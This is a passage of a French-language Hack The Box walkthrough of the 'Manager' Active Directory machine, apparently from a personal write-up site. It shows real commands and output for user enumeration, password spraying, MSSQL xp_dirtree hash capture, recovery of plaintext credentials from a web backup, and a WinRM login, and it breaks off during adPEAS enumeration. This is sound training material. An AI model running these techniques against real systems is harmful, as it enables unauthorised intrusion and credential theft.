+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Resolute/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Resolute
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Visual/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Visual
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table des matières">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table des matières
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      Nmap:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#operator" class="md-nav__link">
+    <span class="md-ellipsis">
+      Operator
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xp_dirtree" class="md-nav__link">
+    <span class="md-ellipsis">
+      xp_dirtree
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#raven" class="md-nav__link">
+    <span class="md-ellipsis">
+      Raven
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privesc-admin-esc7" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privesc Admin - ESC7
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  <h1>Manager</h1>
+
+<table>
+<thead>
+<tr>
+<th>Room</th>
+<th>Manager</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Url</td>
+<td>https://app.hackthebox.com/machines/Manager</td>
+</tr>
+<tr>
+<td>Sujets</td>
+<td>Windows/AD/ADCS</td>
+</tr>
+<tr>
+<td>Active/Retired lors de la résolution</td>
+<td>Active</td>
+</tr>
+<tr>
+<td>Difficulté</td>
+<td>Medium</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="nmap">Nmap:</h3>
+<pre><code>53/tcp    open  domain        syn-ack Simple DNS Plus
+80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
+| http-methods:
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Manager
+88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-02-22 07:53:13Z)
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc01.manager.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
+| Issuer: commonName=manager-DC01-CA/domainComponent=manager
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-07-30T13:51:28
+| Not valid after:  2024-07-29T13:51:28
+| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
+| SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
+| -----BEGIN CERTIFICATE-----
+| MIIGMDCCBRigAwIBAgITXwAAAAnyIQ82Fp4XhwAAAAAACTANBgkqhkiG9w0BAQsF
+##SNIP##
+| 5U81h/XKD4e21fDdv4wge+LFubtqzOqOKWXlrOXcfdc7dBdRt+tD3bIcTO63AQFC
+| A0xH1Q==
+|_-----END CERTIFICATE-----
+|_ssl-date: 2024-02-22T07:54:42+00:00; +7h00m06s from scanner time.
+445/tcp   open  microsoft-ds? syn-ack
+464/tcp   open  kpasswd5?     syn-ack
+593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2024-02-22T07:54:43+00:00; +7h00m06s from scanner time.
+| ssl-cert: Subject: commonName=dc01.manager.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
+| Issuer: commonName=manager-DC01-CA/domainComponent=manager
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-07-30T13:51:28
+| Not valid after:  2024-07-29T13:51:28
+| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
+| SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
+| -----BEGIN CERTIFICATE-----
+| MIIGMDCCBRigAwIBAgITXwAAAAnyIQ82Fp4XhwAAAAAACTANBgkqhkiG9w0BAQsF
+##SNIP##
+| 5U81h/XKD4e21fDdv4wge+LFubtqzOqOKWXlrOXcfdc7dBdRt+tD3bIcTO63AQFC
+| A0xH1Q==
+|_-----END CERTIFICATE-----
+1433/tcp  open  ms-sql-s      syn-ack Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-ntlm-info:
+|   10.10.11.236:1433:
+|     Target_Name: MANAGER
+|     NetBIOS_Domain_Name: MANAGER
+|     NetBIOS_Computer_Name: DC01
+|     DNS_Domain_Name: manager.htb
+|     DNS_Computer_Name: dc01.manager.htb
+|     DNS_Tree_Name: manager.htb
+|_    Product_Version: 10.0.17763
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Issuer: commonName=SSL_Self_Signed_Fallback
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-02-22T07:50:26
+| Not valid after:  2054-02-22T07:50:26
+| MD5:   85f5:4fb8:7578:78df:69cf:b054:b2e7:29cc
+| SHA-1: 7523:daf4:c653:0918:f90e:036c:a73a:5019:1ff0:4793
+| -----BEGIN CERTIFICATE-----
+| MIIDADCCAeigAwIBAgIQNacWjVih9JNNmmJkQkeUsTANBgkqhkiG9w0BAQsFADA7
+##SNIP##
+| aYA/nOd7X6y07FoTCee6uFRAo89Q6TJO0YrkDjLYFx/IWxkPYugo6XX/WHNXzgJz
+| 94C4VA==
+|_-----END CERTIFICATE-----
+| ms-sql-info:
+|   10.10.11.236:1433:
+|     Version:
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+|_ssl-date: 2024-02-22T07:54:42+00:00; +7h00m06s from scanner time.
+3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2024-02-22T07:54:42+00:00; +7h00m06s from scanner time.
+| ssl-cert: Subject: commonName=dc01.manager.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
+| Issuer: commonName=manager-DC01-CA/domainComponent=manager
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-07-30T13:51:28
+| Not valid after:  2024-07-29T13:51:28
+| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
+| SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
+| -----BEGIN CERTIFICATE-----
+| MIIGMDCCBRigAwIBAgITXwAAAAnyIQ82Fp4XhwAAAAAACTANBgkqhkiG9w0BAQsF
+##SNIP##
+| 5U81h/XKD4e21fDdv4wge+LFubtqzOqOKWXlrOXcfdc7dBdRt+tD3bIcTO63AQFC
+| A0xH1Q==
+|_-----END CERTIFICATE-----
+3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2024-02-22T07:54:43+00:00; +7h00m06s from scanner time.
+| ssl-cert: Subject: commonName=dc01.manager.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
+| Issuer: commonName=manager-DC01-CA/domainComponent=manager
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-07-30T13:51:28
+| Not valid after:  2024-07-29T13:51:28
+| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
+| SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
+| -----BEGIN CERTIFICATE-----
+| MIIGMDCCBRigAwIBAgITXwAAAAnyIQ82Fp4XhwAAAAAACTANBgkqhkiG9w0BAQsF
+##SNIP##
+| A0xH1Q==
+|_-----END CERTIFICATE-----
+5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
+49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49669/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49683/tcp open  tcpwrapped    syn-ack
+49732/tcp open  msrpc         syn-ack Microsoft Windows RPC
+64099/tcp open  msrpc         syn-ack Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre>
+<p>On ajoute le domaine à notre fichier /etc/hosts:</p>
+<pre><code>10.10.11.236  manager.htb dc01.manager.htb
+</code></pre>
+<p>Je tente ensuite d'énumérer les sous-domaines:</p>
+<pre><code class="language-bash">ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://10.10.11.136 -H &quot;HOST: FUZZ.manager.htb&quot; 
+</code></pre>
+<p>Mais sans résultat. Un dig du DNS ne renvoie rien non plus, et un feroxbuster du site ne donne rien de particulier:</p>
+<pre><code class="language-bash">pak@DESKTOP-AF1CU53:~$ feroxbuster -u http://manager.htb -w /usr/share/wordlists/dirb/big.txt
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben &quot;epi&quot; Risher 🤓                 ver: 2.10.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://manager.htb
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/wordlists/dirb/big.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.10.1
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET      224l      650w     7900c http://manager.htb/service.html
+200      GET      507l     1356w    18203c http://manager.htb/index.html
+200      GET       10l       42w     2704c http://manager.htb/images/call-o.png
+200      GET        4l       20w     1337c http://manager.htb/images/s-2.png
+200      GET        6l       22w     1052c http://manager.htb/images/location.png
+200      GET      165l      367w     5317c http://manager.htb/contact.html
+200      GET        9l       31w     2492c http://manager.htb/images/s-3.png
+200      GET        6l       20w     1360c http://manager.htb/images/location-o.png
+200      GET        9l       41w     2465c http://manager.htb/images/s-4.png
+200      GET      157l      414w     5386c http://manager.htb/about.html
+200      GET        6l       17w     1553c http://manager.htb/images/s-1.png
+200      GET        7l       29w     1606c http://manager.htb/images/envelope-o.png
+200      GET      614l     1154w    11838c http://manager.htb/css/style.css
+200      GET       10l       43w     2023c http://manager.htb/images/call.png
+200      GET       85l      128w     1389c http://manager.htb/css/responsive.css
+200      GET       14l       48w     3837c http://manager.htb/images/logo.png
+200      GET        9l       25w     1255c http://manager.htb/images/envelope.png
+200      GET      149l      630w    53431c http://manager.htb/images/client.jpg
+200      GET       82l      542w    56157c http://manager.htb/images/contact-img.jpg
+200      GET     4437l    10999w   131863c http://manager.htb/js/bootstrap.js
+200      GET        2l     1276w    88145c http://manager.htb/js/jquery-3.4.1.min.js
+200      GET    10038l    19587w   192348c http://manager.htb/css/bootstrap.css
+403      GET       29l       92w     1233c http://manager.htb/css/
+403      GET       29l       92w     1233c http://manager.htb/images/
+403      GET       29l       92w     1233c http://manager.htb/js/
+200      GET     1313l     7384w   563817c http://manager.htb/images/about-img.png
+200      GET      507l     1356w    18203c http://manager.htb/
+301      GET        2l       10w      149c http://manager.htb/Images =&gt; http://manager.htb/Images/
+301      GET        2l       10w      146c http://manager.htb/css =&gt; http://manager.htb/css/
+301      GET        2l       10w      149c http://manager.htb/images =&gt; http://manager.htb/images/
+301      GET        2l       10w      145c http://manager.htb/js =&gt; http://manager.htb/js/
+</code></pre>
+<p>On regarde du côté de smb, pour voir si éventuellement on aurait accès à un partage particulier :</p>
+<pre><code class="language-bash">pak@DESKTOP-AF1CU53:~$ smbclient -L 10.10.11.236
+Password for [WORKGROUP\pak]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share
+        SYSVOL          Disk      Logon server share
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.11.236 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+</code></pre>
+<p>Bon, à première vue il ne reste pas énormément de solutions. Je tente une énumération d'utilisateur via kerbrute:</p>
+<pre><code class="language-bash">pak@DESKTOP-AF1CU53:~/Downloads$ ./kerbrute_linux_amd64 userenum -d manager.htb --dc dc01.manager.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: v1.0.3 (9dad6e1) - 02/22/24 - Ronnie Flathers @ropnop
+
+2024/02/22 02:03:43 &gt;  Using KDC(s):
+2024/02/22 02:03:43 &gt;   dc01.manager.htb:88
+
+2024/02/22 02:03:43 &gt;  [+] VALID USERNAME:       ryan@manager.htb
+2024/02/22 02:03:45 &gt;  [+] VALID USERNAME:       guest@manager.htb
+2024/02/22 02:03:45 &gt;  [+] VALID USERNAME:       cheng@manager.htb
+2024/02/22 02:03:46 &gt;  [+] VALID USERNAME:       raven@manager.htb
+2024/02/22 02:03:48 &gt;  [+] VALID USERNAME:       administrator@manager.htb
+2024/02/22 02:03:54 &gt;  [+] VALID USERNAME:       Ryan@manager.htb
+2024/02/22 02:03:55 &gt;  [+] VALID USERNAME:       Raven@manager.htb
+2024/02/22 02:03:58 &gt;  [+] VALID USERNAME:       operator@manager.htb
+2024/02/22 02:04:27 &gt;  [+] VALID USERNAME:       Guest@manager.htb
+2024/02/22 02:04:28 &gt;  [+] VALID USERNAME:       Administrator@manager.htb
+2024/02/22 02:04:48 &gt;  [+] VALID USERNAME:       Cheng@manager.htb
+2024/02/22 02:05:46 &gt;  [+] VALID USERNAME:       jinwoo@manager.htb
+2024/02/22 02:05:57 &gt;  [+] VALID USERNAME:       RYAN@manager.htb
+2024/02/22 02:06:33 &gt;  [+] VALID USERNAME:       RAVEN@manager.htb
+2024/02/22 02:06:35 &gt;  [+] VALID USERNAME:       GUEST@manager.htb
+2024/02/22 02:07:31 &gt;  [+] VALID USERNAME:       Operator@manager.htb
+2024/02/22 02:13:45 &gt;  [+] VALID USERNAME:       OPERATOR@manager.htb
+</code></pre>
+<p>On voit quelques utilisateurs : ryan, cheng, raven, operator, jinwoo. Je mets ces noms d'utilisateur dans un fichier "userlist" pour me faciliter la vie plus tard.</p>
+<p>On a quelques utilisateurs, on peut tenter de l'asreproasting :</p>
+<pre><code class="language-bash">pak@DESKTOP-AF1CU53:~/tmp$ impacket-GetNPUsers -usersfile userlist -dc-ip 10.10.11.236 manager.htb/
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[-] User ryan doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User cheng doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User raven doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User jinwoo doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User operator doesn't have UF_DONT_REQUIRE_PREAUTH set
+</code></pre>
+<p>Rhaaaa... je regarde si je n'ai rien oublié qui pourrait me sauter aux yeux, et pendant ce temps je lance un bruteforce sur ces utilisateurs pour tenter de trouver un mot de passe. C'est bourrin, j'aime pas trop, mais je ne vois rien d'autre d'évident. </p>
+<p>Au bout d'un temps certains, un pass est trouvé :).</p>
+<pre><code class="language-bash">pak@DESKTOP-AF1CU53:~/Downloads$ crackmapexec smb 10.10.11.236 -u ../tmp/userlist -p /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt
+##SNIP##
+SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator
+</code></pre>
+<p>operator:operator.... Aller, pourquoi pas.</p>
+<p>Je confirme ces creds:</p>
+<pre><code>pak@DESKTOP-AF1CU53:~/Downloads$ crackmapexec smb 10.10.11.236 -u operator -p operator
+SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator
+</code></pre>
+<p>Oookay, on a un utilisateur. On peut continuer :) !</p>
+<h3 id="operator">Operator</h3>
+<p>Avec un utilisateur, on peut énumérer les autres. Je ne sais pas si ça me servira, mais en tout cas ça va dans ma liste !</p>
+<pre><code class="language-bash">pak@DESKTOP-AF1CU53:~/Downloads$ crackmapexec ldap 10.10.11.236 -u operator -p operator --users
+SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
+LDAP        10.10.11.236    389    DC01             [+] manager.htb\operator:operator
+LDAP        10.10.11.236    389    DC01             [*] Total of records returned 13
+LDAP        10.10.11.236    389    DC01             Administrator                  Built-in account for administering the computer/domain
+LDAP        10.10.11.236    389    DC01             Guest                          Built-in account for guest access to the computer/domain
+LDAP        10.10.11.236    389    DC01             krbtgt                         Key Distribution Center Service Account
+LDAP        10.10.11.236    389    DC01             Zhong
+LDAP        10.10.11.236    389    DC01             Cheng
+LDAP        10.10.11.236    389    DC01             Ryan
+LDAP        10.10.11.236    389    DC01             Raven
+LDAP        10.10.11.236    389    DC01             JinWoo
+LDAP        10.10.11.236    389    DC01             ChinHae
+LDAP        10.10.11.236    389    DC01             Operator
+</code></pre>
+<p>On en profite pour tenter un kerberoasting qui ne donne rien :</p>
+<pre><code class="language-bash">pak@DESKTOP-AF1CU53:~/Downloads$ crackmapexec ldap 10.10.11.236 -u operator -p operator --kerberoasting kerberoasted.txt
+SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
+LDAP        10.10.11.236    389    DC01             [+] manager.htb\operator:operator
+LDAP        10.10.11.236    389    DC01             No entries found!
+</code></pre>
+<p>Et voir si nous avons plus de droits sur les partages :</p>
+<pre><code class="language-bash">pak@DESKTOP-AF1CU53:~/Downloads$ crackmapexec smb 10.10.11.236 -u operator -p operator --shares
+SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator
+SMB         10.10.11.236    445    DC01             [+] Enumerated shares
+SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
+SMB         10.10.11.236    445    DC01             -----           -----------     ------
+SMB         10.10.11.236    445    DC01             ADMIN$                          Remote Admin
+SMB         10.10.11.236    445    DC01             C$                              Default share
+SMB         10.10.11.236    445    DC01             IPC$            READ            Remote IPC
+SMB         10.10.11.236    445    DC01             NETLOGON        READ            Logon server share
+SMB         10.10.11.236    445    DC01             SYSVOL          READ            Logon server share
+</code></pre>
+<p>Rien de bien particulier. Je continue d'énumérer rapidement, et vois que je peux me connecter à la base de données MsSQL. Je pense que la suite se trouvera par ici :)...</p>
+<pre><code class="language-bash">pak@DESKTOP-AF1CU53:~/Downloads$ crackmapexec mssql 10.10.11.236 -u operator -p operator -q 'SELECT name FROM master.dbo.sysdatabases;'
+MSSQL       10.10.11.236    1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
+MSSQL       10.10.11.236    1433   DC01             [+] manager.htb\operator:operator
+MSSQL       10.10.11.236    1433   DC01             name
+MSSQL       10.10.11.236    1433   DC01             ------
+MSSQL       10.10.11.236    1433   DC01             master
+MSSQL       10.10.11.236    1433   DC01             tempdb
+MSSQL       10.10.11.236    1433   DC01             model
+MSSQL       10.10.11.236    1433   DC01             msdb
+</code></pre>
+<p>Je me connecte en direct au serveur :</p>
+<pre><code class="language-bash">pak@DESKTOP-AF1CU53:~/Downloads$ impacket-mssqlclient -windows-auth manager.htb/operator:operator@10.10.11.236
+</code></pre>
+<p>Ce qui me vient directement comme idée là-dessus, c'est de lancer responder sur ma machine, utiliser xp_dirtree sur le serveur et voir si j'obtiens une réponse :</p>
+<pre><code class="language-sql">SQL (MANAGER\Operator  guest@master)&gt; xp_dirtree \\10.10.16.10\fauxpartage
+subdirectory   depth   file
+------------   -----   ----
+SQL (MANAGER\Operator  guest@master)&gt;
+</code></pre>
+<pre><code class="language-bash">DC01$::MANAGER:7e9d3c9bb6415dff:5DA46A928DF5BF19541063C4CB527C17:0101000000000000803FF5899365DA012BF2D85E7EC63FC30000000002000800430033004200420001001E00570049004E002D004300330049005500360050005900320044004600330004003400570049004E002D00430033004900550036005000590032004400460033002E0043003300420042002E004C004F00430041004C000300140043003300420042002E004C004F00430041004C000500140043003300420042002E004C004F00430041004C0007000800803FF5899365DA0106000400020000000800300030000000000000000000000000300000A2CE93D6583FE8B00E95F0C748AA0E517A8E902DA9BF533DD7235C76C21DE6FF0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310030000000000000000000
+</code></pre>
+<p>Okay, on a un résultat, voyons voir si il est exploitable... Evidemment, non, ce serait beaucoup trop simple :). </p>
+<h3 id="xp_dirtree">xp_dirtree</h3>
+<p>Par contre, xp_dirtree fonctionne donc je peux potentiellement me balader dans les fichiers du serveur:</p>
+<pre><code class="language-bash">SQL (MANAGER\Operator  guest@master)&gt; EXEC xp_dirtree 'C:\', 1, 1;
+subdirectory                depth   file
+-------------------------   -----   ----
+$Recycle.Bin                    1      0
+
+Documents and Settings          1      0
+
+inetpub                         1      0
+
+PerfLogs                        1      0
+
+Program Files                   1      0
+
+Program Files (x86)             1      0
+
+ProgramData                     1      0
+
+Recovery                        1      0
+
+SQL2019                         1      0
+
+System Volume Information       1      0
+
+Users                           1      0
+
+Windows                         1      0
+</code></pre>
+<pre><code class="language-bash">SQL (MANAGER\Operator  guest@master)&gt; EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
+subdirectory                      depth   file
+-------------------------------   -----   ----
+about.html                            1      1
+
+contact.html                          1      1
+
+css                                   1      0
+
+images                                1      0
+
+index.html                            1      1
+
+js                                    1      0
+
+service.html                          1      1
+
+web.config                            1      1
+
+website-backup-27-07-23-old.zip       1      1
+</code></pre>
+<p>Un fichier de backup à la racine du serveur web, intéressant, récupérons le :) ! </p>
+<pre><code class="language-bash">pak@DESKTOP-AF1CU53:~/tmp$ wget http://manager.htb/website-backup-27-07-23-old.zip
+--2024-02-22 14:06:04--  http://manager.htb/website-backup-27-07-23-old.zip
+Resolving manager.htb (manager.htb)... 10.10.11.236
+Connecting to manager.htb (manager.htb)|10.10.11.236|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1045328 (1021K) [application/x-zip-compressed]
+Saving to: ‘website-backup-27-07-23-old.zip’
+
+website-backup-27-07-23-old.zip    100%[==============================================================&gt;]   1021K  3.78MB/s    in 0.3s
+
+2024-02-22 14:06:05 (3.78 MB/s) - ‘website-backup-27-07-23-old.zip’ saved [1045328/1045328]
+</code></pre>
+<pre><code class="language-bash">pak@DESKTOP-AF1CU53:~/tmp$ unzip website-backup-27-07-23-old.zip
+Archive:  website-backup-27-07-23-old.zip
+  inflating: .old-conf.xml
+  inflating: about.html
+  inflating: contact.html
+  inflating: css/bootstrap.css
+  inflating: css/responsive.css
+  inflating: css/style.css
+  inflating: css/style.css.map
+  inflating: css/style.scss
+  inflating: images/about-img.png
+  inflating: images/body_bg.jpg
+ extracting: images/call.png
+ extracting: images/call-o.png
+  inflating: images/client.jpg
+  inflating: images/contact-img.jpg
+ extracting: images/envelope.png
+ extracting: images/envelope-o.png
+  inflating: images/hero-bg.jpg
+ extracting: images/location.png
+ extracting: images/location-o.png
+ extracting: images/logo.png
+  inflating: images/menu.png
+ extracting: images/next.png
+ extracting: images/next-white.png
+  inflating: images/offer-img.jpg
+  inflating: images/prev.png
+ extracting: images/prev-white.png
+ extracting: images/quote.png
+ extracting: images/s-1.png
+ extracting: images/s-2.png
+ extracting: images/s-3.png
+ extracting: images/s-4.png
+ extracting: images/search-icon.png
+  inflating: index.html
+  inflating: js/bootstrap.js
+  inflating: js/jquery-3.4.1.min.js
+  inflating: service.html
+</code></pre>
+<p>Tout de suite un fichier me saute aux yeux : .old-conf.xml</p>
+<pre><code class="language-bash">pak@DESKTOP-AF1CU53:~/tmp$ cat .old-conf.xml
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;ldap-conf xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;
+   &lt;server&gt;
+      &lt;host&gt;dc01.manager.htb&lt;/host&gt;
+      &lt;open-port enabled=&quot;true&quot;&gt;389&lt;/open-port&gt;
+      &lt;secure-port enabled=&quot;false&quot;&gt;0&lt;/secure-port&gt;
+      &lt;search-base&gt;dc=manager,dc=htb&lt;/search-base&gt;
+      &lt;server-type&gt;microsoft&lt;/server-type&gt;
+      &lt;access-user&gt;
+         &lt;user&gt;raven@manager.htb&lt;/user&gt;
+         &lt;password&gt;R4v3nBe5tD3veloP3r!123&lt;/password&gt;
+      &lt;/access-user&gt;
+      &lt;uid-attribute&gt;cn&lt;/uid-attribute&gt;
+   &lt;/server&gt;
+   &lt;search type=&quot;full&quot;&gt;
+      &lt;dir-list&gt;
+         &lt;dir&gt;cn=Operator1,CN=users,dc=manager,dc=htb&lt;/dir&gt;
+      &lt;/dir-list&gt;
+   &lt;/search&gt;
+&lt;/ldap-conf&gt;
+</code></pre>
+<p>Bingo ! </p>
+<pre><code class="language-bash">pak@DESKTOP-AF1CU53:~/tmp$ crackmapexec smb 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
+SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.236    445    DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123
+</code></pre>
+<p>Et un accès à WinRM en prime... :)</p>
+<pre><code class="language-bash">pak@DESKTOP-AF1CU53:~/tmp$ evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Raven\Documents&gt;
+</code></pre>
+<h3 id="raven">Raven</h3>
+<p>Bon, il serait temps de sortir l'AdPEAS :</p>
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\Raven\Documents&gt; upload /home/pak/Tools/Windows/AD/adPEAS.ps1
+
+Info: Uploading /home/pak/Tools/Windows/AD/adPEAS.ps1 to C:\Users\Raven\Documents\adPEAS.ps1
+
+Data: 4159704 bytes of 4159704 bytes copied
+
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\Raven\Documents&gt; Import-Module .\adPEAS.ps1
+*Evil-WinRM* PS C:\Users\Raven\Documents&gt; Invoke-adPEAS
+
+               _ _____  ______           _____
+              | |  __ \|  ____|   /\    / ____|
+      ____  __| | |__) | |__     /  \  | (___
